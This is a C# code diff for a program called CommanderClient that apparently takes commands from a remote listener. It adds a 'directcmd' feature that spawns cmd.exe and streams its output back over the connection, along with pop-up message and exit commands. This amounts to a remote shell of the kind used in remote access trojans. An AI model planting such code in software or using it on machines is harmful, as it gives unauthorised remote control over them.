@@ -3,7 +3,9 @@ using System.Linq;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Text.RegularExpressions;
-using System.Threading.Tasks;
+using System.Threading;
+using System.Text;
+using System.Windows.Forms;
 
 namespace CommanderClient
 {
@@ -15,6 +17,9 @@ namespace CommanderClient
 			Commands["print"] = new command(Print);
 			Commands["info"] = new command(Info);
 			Commands["close"] = new command(Close);
+			Commands["msg"] = new command(ShowMessage);
+			Commands["directcmd"] = new command(DirectCmd.Run);
+			Commands["closecmd"] = new command(DirectCmd.Close);
 		}
 		public void Do(string CommandLine) {
 			string Command = CommandLine;
@@ -60,17 +65,31 @@ namespace CommanderClient
 				}
 			}
 		}
+
+
+		static MessageBox messageBox;
+		//uncompleted
+		public static void ShowMessage(string[] args) {
+			messageBox = new MessageBox(args[0], args[1]);
+			messageBox.ShowDialog();
+		}
+		
 		public static void Print(string[] args) {
+			//write output of program, useful for muted clients
 			try {
-				if (args.Length > 0)
-					if (args[0] == "-f" || args[0] == "--full") {
-						Listener.CmdProcess.StandardOutput.BaseStream.Position = 0;
+				if (Listener.CommandProcess.HasExited) {
+					if (args.Length > 0)
+						if (args[0] == "-f" || args[0] == "--full") {
+							Listener.CommandProcess.StandardOutput.BaseStream.Position = 0;
+						}
+					if (Listener.CommandProcess != null) {
+						string output = Listener.CommandProcess.StandardOutput.ReadToEnd();
+						Listener.Send(output);
+					} else {
+						Listener.Send("Theres not any cmd to read output");
 					}
-				if (Listener.CmdProcess != null) {
-					string output = Listener.CmdProcess.StandardOutput.ReadToEnd();
-					Listener.Send(output);
 				} else {
-					Listener.Send("Theres not any cmd to read output");
+					Listener.Send("Proccess not exited.");
 				}
 			}catch(Exception ex) { Listener.Send(ex.Message); }
 		}
@@ -84,6 +103,39 @@ namespace CommanderClient
 		}
 		public static void Close(string[] args) {
 			Environment.Exit(0);
+		}
+		public class DirectCmd
+		{
+			public static Process CmdProcess = null;        //Direct cmd control process
+			private static Thread Share = new Thread(new ThreadStart(CmdReader));
+			public static void Run(string[] args) {
+				//run an direct cmd
+				if (CmdProcess == null) {
+					var startInf = new ProcessStartInfo("cmd.exe") {
+						UseShellExecute = false,
+						RedirectStandardOutput = true,
+						RedirectStandardInput = true,
+					};
+					CmdProcess = Process.Start(startInf);
+					Share.Start();
+				}
+			}
+			private static void CmdReader() {
+				while (!CmdProcess.HasExited) {
+					int ch=CmdProcess.StandardOutput.Read();
+					Console.Write((char)ch);
+					Listener.Send(((char)ch).ToString());
+				}
+				Close(null);
+				CmdProcess = null;
+			}
+			public static void Close(string[] args) {
+				if (!CmdProcess.HasExited)
+					CmdProcess.Kill();
+				if (Share.ThreadState == System.Threading.ThreadState.Running)
+					Share.Abort();
+				Listener.Send("Direct cmd had been closed");
+			}
 		}
 	}
 	delegate void command(string[] args);
